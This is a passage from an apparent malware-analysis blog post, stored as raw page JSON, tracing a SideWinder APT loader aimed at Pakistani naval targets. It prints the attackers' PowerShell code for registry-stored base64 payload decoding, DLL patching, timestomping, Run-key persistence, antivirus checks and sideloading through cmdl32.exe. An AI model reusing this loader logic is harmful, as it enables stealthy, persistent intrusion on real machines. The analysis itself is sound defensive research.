[io.file]::WriteAllBytes($binPath,$bytes) | Out-Null;\n updt -t $binPath -b $cmdl32path","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_42":{"__typename":"Paragraph","id":"9376201130db_42","name":"9d6a","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$b64dll = dc -s ((Get-ItemProperty -Path $system).part2);\n $bytes = [System.Convert]::FromBase64String(“TVq” + $b64dll);\n [array]::copy($line,0,$bytes,(sb -h $bytes -n $buf6),64);\n New-Item -ItemType Directory -Force -Path $binDir | Out-Null;\n [io.file]::WriteAllBytes($binPathdll,$bytes) | Out-Null;\n updt -t $binPathdll -b $cmdl32path\n }","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_43":{"__typename":"Paragraph","id":"9376201130db_43","name":"ca4f","type":"BQ","href":null,"layout":null,"metadata":null,"text":"Remove-Item -Path $system | Out-Null;\n Remove-Item $PROFILE.CurrentUserAllHosts | Out-Null;\n New-ItemProperty -Path $run -Name “Winsound” -PropertyType String -Value $dmybinPath | Out-Null;\n \n Copy-Item $msvbvmdllpath $rpcdllpath\n updt -t $rpcdllpath -b $msvbvmdllpath","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_44":{"__typename":"Paragraph","id":"9376201130db_44","name":"28b4","type":"BQ","href":null,"layout":null,"metadata":null,"text":"Copy-Item $cmdl32path $dmybinPath\n updt -t $dmybinPath -b $cmdl32path","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_45":{"__typename":"Paragraph","id":"9376201130db_45","name":"737b","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$avr = Get-Process $pnameavr -ErrorAction SilentlyContinue\n if (!$avr) {\n &($dmybinPath) | Out-Null;\n }\n Exit\n}\ncatch {\n $_.Exception.Message | Out-Null;\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_46":{"__typename":"Paragraph","id":"9376201130db_46","name":"dd52","type":"P","href":null,"layout":null,"metadata":null,"text":"This powershell checks if the AV 360 is installed:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_47":{"__typename":"Paragraph","id":"9376201130db_47","name":"cc6b","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$pname36 = “3” + “60Tr” + “ay”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_48":{"__typename":"Paragraph","id":"9376201130db_48","name":"fd7e","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$q36 = Get-Process $pname36 -ErrorAction SilentlyContinue;\nif($q36){\n exit\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_49":{"__typename":"Paragraph","id":"9376201130db_49","name":"6f46","type":"P","href":null,"layout":null,"metadata":null,"text":"We can imagine the attackers were made a recon step before.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_50":{"__typename":"Paragraph","id":"9376201130db_50","name":"cfbc","type":"P","href":null,"layout":null,"metadata":null,"text":"The folder where the loadin chain is:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_51":{"__typename":"Paragraph","id":"9376201130db_51","name":"12ee","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$binDir = [Environment]::GetFolderPath([Enum]::ToObject([System.Environment+SpecialFolder], 35))+ “\\” + “Winset\\Config” + “\\”;","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_52":{"__typename":"Paragraph","id":"9376201130db_52","name":"dd1f","type":"P","href":null,"layout":null,"metadata":null,"text":"The powershell copies:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_53":{"__typename":"Paragraph","id":"9376201130db_53","name":"7853","type":"P","href":null,"layout":null,"metadata":null,"text":"$msvbvmdllpath = $env:WINDIR + “\\system32\\msvbvm60.dll”\n$cmdl32path = $env:WINDIR + “\\system32\\cmdl32.exe”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_54":{"__typename":"Paragraph","id":"9376201130db_54","name":"805a","type":"P","href":null,"layout":null,"metadata":null,"text":"Copy-Item $cmdl32path $dmybinPath","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_55":{"__typename":"Paragraph","id":"9376201130db_55","name":"b722","type":"P","href":null,"layout":null,"metadata":null,"text":"Copy-Item $msvbvmdllpath $rpcdllpath","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_56":{"__typename":"Paragraph","id":"9376201130db_56","name":"ba77","type":"P","href":null,"layout":null,"metadata":null,"text":"So msvbvm60.dll becomes: 57146C96.dll","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_57":{"__typename":"Paragraph","id":"9376201130db_57","name":"64ed","type":"P","href":null,"layout":null,"metadata":null,"text":"And Winset.exe and cmpbk32.dll are decoded and copied in the same folder.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_58":{"__typename":"Paragraph","id":"9376201130db_58","name":"4983","type":"P","href":null,"layout":null,"metadata":null,"text":"part1 and part2 is the reg key base here $system = ‘HKCU:Software\\Updater’;:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_59":{"__typename":"Paragraph","id":"9376201130db_59","name":"1042","type":"P","href":null,"layout":null,"metadata":null,"text":"objWSS.RegWrite “HKCU\\Software\\Updater”, “”\nobjWSS.RegWrite “HKCU\\Software\\Updater\\part1”, p1, “REG_SZ”\nobjWSS.RegWrite “HKCU\\Software\\Updater\\part2”, p2, “REG_SZ”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_60":{"__typename":"Paragraph","id":"9376201130db_60","name":"a53d","type":"P","href":null,"layout":null,"metadata":null,"text":"part1 is big blob of base64 data.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_61":{"__typename":"Paragraph","id":"9376201130db_61","name":"6308","type":"P","href":null,"layout":null,"metadata":null,"text":"Firstly the registry key is retrieve:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_62":{"__typename":"Paragraph","id":"9376201130db_62","name":"6384","type":"P","href":null,"layout":null,"metadata":null,"text":"(Get-ItemProperty -Path $system).part1","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_63":{"__typename":"Paragraph","id":"9376201130db_63","name":"1a64","type":"P","href":null,"layout":null,"metadata":null,"text":"after is the function dc is called.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_64":{"__typename":"Paragraph","id":"9376201130db_64","name":"992c","type":"BQ","href":null,"layout":null,"metadata":null,"text":"function dc($s){\n sal n New-Object;\n $data = [System.Convert]::FromBase64String(“H4sIAAAAAAA” + $s);\n $ms = n System.IO.MemoryStream;\n $ms.Write($data, 0, $data.Length);\n $ms.Seek(0,0) | Out-Null;\n return (n System.IO.StreamReader(n System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd();\n};","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_65":{"__typename":"Paragraph","id":"9376201130db_65","name":"35c5","type":"P","href":null,"layout":null,"metadata":null,"text":"this string “H4sIAAAAAAA” is added at part2 and the data is decoded an","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_66":{"__typename":"Paragraph","id":"9376201130db_66","name":"2852","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$data = [System.Convert]::FromBase64String(“H4sIAAAAAAA” + $s);","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_67":{"__typename":"Paragraph","id":"9376201130db_67","name":"ca52","type":"P","href":null,"layout":null,"metadata":null,"text":"and unzip:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_68":{"__typename":"Paragraph","id":"9376201130db_68","name":"5f3b","type":"BQ","href":null,"layout":null,"metadata":null,"text":"[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd();\n};","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_69":{"__typename":"Paragraph","id":"9376201130db_69","name":"ae1f","type":"P","href":null,"layout":null,"metadata":null,"text":"and the Mz header in base64 is added and decoded:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_70":{"__typename":"Paragraph","id":"9376201130db_70","name":"10e5","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$bytes = [System.Convert]::FromBase64String(“TVq” + $b64);","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_71":{"__typename":"Paragraph","id":"9376201130db_71","name":"762a","type":"P","href":null,"layout":null,"metadata":null,"text":"and the executable is modified for the last time and copied in $binDir:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_72":{"__typename":"Paragraph","id":"9376201130db_72","name":"442c","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$bytes = [System.Convert]::FromBase64String(“TVq” + $b64);\n $rn = [System.BitConverter]::GetBytes((Get-Random -Maximum 9999 -Minimum 1111))[0..1];\n [array]::copy($rn,0,$bytes,$bytes.length — 2,2);\n New-Item -ItemType Directory -Force -Path $binDir | Out-Null;\n [io.file]::WriteAllBytes($binPath,$bytes) | Out-Null;","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_73":{"__typename":"Paragraph","id":"9376201130db_73","name":"7639","type":"P","href":null,"layout":null,"metadata":null,"text":"The dll is decoded, modified and written on disk in the same way:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_74":{"__typename":"Paragraph","id":"9376201130db_74","name":"da3f","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$b64dll = dc -s ((Get-ItemProperty -Path $system).part2);\n $bytes = [System.Convert]::FromBase64String(“TVq” + $b64dll);\n [array]::copy($line,0,$bytes,(sb -h $bytes -n $buf6),64);\n New-Item -ItemType Directory -Force -Path $binDir | Out-Null;\n [io.file]::WriteAllBytes($binPathdll,$bytes) | Out-Null;\n updt -t $binPathdll -b $cmdl32path","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_75":{"__typename":"Paragraph","id":"9376201130db_75","name":"bcfb","type":"P","href":null,"layout":null,"metadata":null,"text":"The Trick very important here is : [array]::copy($line,0,$bytes,(sb -h $bytes -n $buf6),64); to modify the dll.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":35,"end":94,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_76":{"__typename":"Paragraph","id":"9376201130db_76","name":"8d37","type":"P","href":null,"layout":null,"metadata":null,"text":"If you decode the before the modification you have a dll truncated.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_77":{"__typename":"Paragraph","id":"9376201130db_77","name":"5f20","type":"P","href":null,"layout":null,"metadata":null,"text":"before:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*mwhQ9Jt9xLiVaH_mVv6uaw.png":{"__typename":"ImageMetadata","id":"1*mwhQ9Jt9xLiVaH_mVv6uaw.png","originalHeight":523,"originalWidth":989,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_78":{"__typename":"Paragraph","id":"9376201130db_78","name":"2d55","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*mwhQ9Jt9xLiVaH_mVv6uaw.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_79":{"__typename":"Paragraph","id":"9376201130db_79","name":"c640","type":"P","href":null,"layout":null,"metadata":null,"text":"after:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*gskxEMV2wHIwHkcKEQu-NQ.png":{"__typename":"ImageMetadata","id":"1*gskxEMV2wHIwHkcKEQu-NQ.png","originalHeight":539,"originalWidth":969,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_80":{"__typename":"Paragraph","id":"9376201130db_80","name":"31f7","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*gskxEMV2wHIwHkcKEQu-NQ.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_81":{"__typename":"Paragraph","id":"9376201130db_81","name":"48ef","type":"P","href":null,"layout":null,"metadata":null,"text":"In fact:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_82":{"__typename":"Paragraph","id":"9376201130db_82","name":"a0e4","type":"P","href":null,"layout":null,"metadata":null,"text":"The powershell modify the dll to add $lines","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_83":{"__typename":"Paragraph","id":"9376201130db_83","name":"32ff","type":"P","href":null,"layout":null,"metadata":null,"text":"and $lines","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_84":{"__typename":"Paragraph","id":"9376201130db_84","name":"45f6","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$line = new-object byte[] 64;\n$buf6 =[Byte[]] (,0x23 * 64);\n$cbytes = [system.Text.Encoding]::ASCII.GetBytes($cmdLine);\n[array]::copy($cbytes,$line,$cbytes.length);","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_85":{"__typename":"Paragraph","id":"9376201130db_85","name":"8e83","type":"P","href":null,"layout":null,"metadata":null,"text":"and $cmdLine","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_86":{"__typename":"Paragraph","id":"9376201130db_86","name":"642b","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$bin =Winset.exe","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_87":{"__typename":"Paragraph","id":"9376201130db_87","name":"175a","type":"BQ","href":null,"layout":null,"metadata":null,"text":"$cmdLine = ([int]$c).toString(“00000000”)+([int]$m).toString(“00000000”);\n$cmdLine = $bin+ “ “ +$cmdLine;\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_88":{"__typename":"Paragraph","id":"9376201130db_88","name":"28ce","type":"P","href":null,"layout":null,"metadata":null,"text":"like in the dll: .string “Winset.exe -0000000100001223","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_89":{"__typename":"Paragraph","id":"9376201130db_89","name":"924e","type":"P","href":null,"layout":null,"metadata":null,"text":"So we have in the same folder: Winset\\Config","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_90":{"__typename":"Paragraph","id":"9376201130db_90","name":"ccf4","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Winset.exe (part1 modified and decoded)is a fake Windows Security Configuration Editor Command Tool","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_91":{"__typename":"Paragraph","id":"9376201130db_91","name":"170f","type":"ULI","href":null,"layout":null,"metadata":null,"text":"cmpbk32.dll (part2 modified and decoded)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_92":{"__typename":"Paragraph","id":"9376201130db_92","name":"9727","type":"ULI","href":null,"layout":null,"metadata":null,"text":"57146C96.dll (vb virtual machine)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_93":{"__typename":"Paragraph","id":"9376201130db_93","name":"423f","type":"ULI","href":null,"layout":null,"metadata":null,"text":"cmdl32.exe (executable of windows)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_94":{"__typename":"Paragraph","id":"9376201130db_94","name":"e1ff","type":"P","href":null,"layout":null,"metadata":null,"text":"The powershell change timestamps of files copied:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_95":{"__typename":"Paragraph","id":"9376201130db_95","name":"a795","type":"BQ","href":null,"layout":null,"metadata":null,"text":"updt -t $binPathdll -b $cmdl32path","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_96":{"__typename":"Paragraph","id":"9376201130db_96","name":"84da","type":"BQ","href":null,"layout":null,"metadata":null,"text":"updt -t $binPath -b $cmdl32path","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_97":{"__typename":"Paragraph","id":"9376201130db_97","name":"1537","type":"BQ","href":null,"layout":null,"metadata":null,"text":"function updt($t, $b){\n (ls $t).LastWriteTime = (ls $b).LastWriteTime\n (ls $t).CreationTime = (ls $b).CreationTime\n (ls $t).LastAccessTime = (ls $b).LastAccessTime\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_98":{"__typename":"Paragraph","id":"9376201130db_98","name":"4f4a","type":"H3","href":null,"layout":null,"metadata":null,"text":"Persistance","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_99":{"__typename":"Paragraph","id":"9376201130db_99","name":"2a4d","type":"P","href":null,"layout":null,"metadata":null,"text":"The persistant is a hkey run very basic with the path of the dll in parameter:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_100":{"__typename":"Paragraph","id":"9376201130db_100","name":"2963","type":"P","href":null,"layout":null,"metadata":null,"text":"$run = ‘HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\\’;","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_101":{"__typename":"Paragraph","id":"9376201130db_101","name":"9dd6","type":"P","href":null,"layout":null,"metadata":null,"text":"New-ItemProperty -Path $run -Name “Winsound” -PropertyType String -Value $dmybinPath | Out-Null;","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_102":{"__typename":"Paragraph","id":"9376201130db_102","name":"09a4","type":"P","href":null,"layout":null,"metadata":null,"text":"To reload cmpbk32.dll at each reboot of the system and execute the dllmain of the dll.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_103":{"__typename":"Paragraph","id":"9376201130db_103","name":"d509","type":"H3","href":null,"layout":null,"metadata":null,"text":"Loading Chain","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_104":{"__typename":"Paragraph","id":"9376201130db_104","name":"ce69","type":"P","href":null,"layout":null,"metadata":null,"text":"The powershell launch cmdl32.exe (“Connection Manager Phonebook Downloader”) trusted by AV because it’s develloped by Microsoft.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_105":{"__typename":"Paragraph","id":"9376201130db_105","name":"8812","type":"P","href":null,"layout":null,"metadata":null,"text":"this exe used: cmpbk32.dll","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*NyF5UD6MIWldtbpEr3y5IQ.png":{"__typename":"ImageMetadata","id":"1*NyF5UD6MIWldtbpEr3y5IQ.png","originalHeight":162,"originalWidth":634,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_106":{"__typename":"Paragraph","id":"9376201130db_106","name":"8d19","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*NyF5UD6MIWldtbpEr3y5IQ.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_107":{"__typename":"Paragraph","id":"9376201130db_107","name":"f4e3","type":"P","href":null,"layout":null,"metadata":null,"text":"So when cmdl32.exe is launched cmpbk32.dll is loaded. (in the same directory, side loading)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_108":{"__typename":"Paragraph","id":"9376201130db_108","name":"18a6","type":"P","href":null,"layout":null,"metadata":null,"text":"the entrypoint is exectuted.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*fQ8cDP8CRj8EmmzfKMnXRw.png":{"__typename":"ImageMetadata","id":"1*fQ8cDP8CRj8EmmzfKMnXRw.png","originalHeight":856,"originalWidth":1114,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_109":{"__typename":"Paragraph","id":"9376201130db_109","name":"adf3","type":"IMG","href":null,"layout":"OUTSET_CENTER","metadata":{"__ref":"ImageMetadata:1*fQ8cDP8CRj8EmmzfKMnXRw.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_110":{"__typename":"Paragraph","id":"9376201130db_110","name":"cce4","type":"P","href":null,"layout":null,"metadata":null,"text":"The important part is:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*eSBQqIXyF-U2Qq51FYXsMg.png":{"__typename":"ImageMetadata","id":"1*eSBQqIXyF-U2Qq51FYXsMg.png","originalHeight":203,"originalWidth":850,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_111":{"__typename":"Paragraph","id":"9376201130db_111","name":"c042","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*eSBQqIXyF-U2Qq51FYXsMg.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_112":{"__typename":"Paragraph","id":"9376201130db_112","name":"1fc1","type":"P","href":null,"layout":null,"metadata":null,"text":"The function sub.Winset.exe__0000000100001223_0 launches Winset.exe the real RAT like this “Winset.exe -0000000100001223” ; len=2","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*cyKfNUGcZs3qFmxqlZYEww.png":{"__typename":"ImageMetadata","id":"1*cyKfNUGcZs3qFmxqlZYEww.png","originalHeight":534,"originalWidth":1028,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_113":{"__typename":"Paragraph","id":"9376201130db_113","name":"170a","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*cyKfNUGcZs3qFmxqlZYEww.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_114":{"__typename":"Paragraph","id":"9376201130db_114","name":"5f0d","type":"P","href":null,"layout":null,"metadata":null,"text":"Winset.exe is RAT developed in VB6.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_115":{"__typename":"Paragraph","id":"9376201130db_115","name":"0754","type":"P","href":null,"layout":null,"metadata":null,"text":"You can find an complete analysis here: https:\u002F\u002Fs.tencent.com\u002Fresearch\u002Freport\u002F479.html","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":40,"end":86,"href":"https:\u002F\u002Fs.tencent.com\u002Fresearch\u002Freport\u002F479.html","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_116":{"__typename":"Paragraph","id":"9376201130db_116","name":"9fab","type":"H3","href":null,"layout":null,"metadata":null,"text":"Threat Intelligence","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_117":{"__typename":"Paragraph","id":"9376201130db_117","name":"0e1b","type":"P","href":null,"layout":null,"metadata":null,"text":"We have the TTPs described in Tencent with the same phases.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_118":{"__typename":"Paragraph","id":"9376201130db_118","name":"5363","type":"P","href":null,"layout":null,"metadata":null,"text":"Sidewinder is a Indian Group targeting Pakistan military infrastructure.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_119":{"__typename":"Paragraph","id":"9376201130db_119","name":"0430","type":"P","href":null,"layout":null,"metadata":null,"text":"The content of the RTF is cleary oriented to Navy Pakistani.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_120":{"__typename":"Paragraph","id":"9376201130db_120","name":"fdad","type":"P","href":null,"layout":null,"metadata":null,"text":"If we check the infrastructure of the attackers:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*UNB3nsU-2fey_uCyR0BC4w.png":{"__typename":"ImageMetadata","id":"1*UNB3nsU-2fey_uCyR0BC4w.png","originalHeight":1054,"originalWidth":1024,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_121":{"__typename":"Paragraph","id":"9376201130db_121","name":"4a12","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*UNB3nsU-2fey_uCyR0BC4w.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_122":{"__typename":"Paragraph","id":"9376201130db_122","name":"366b","type":"P","href":null,"layout":null,"metadata":null,"text":"We have www.nadra.gov.pk.d-dns.co cleary 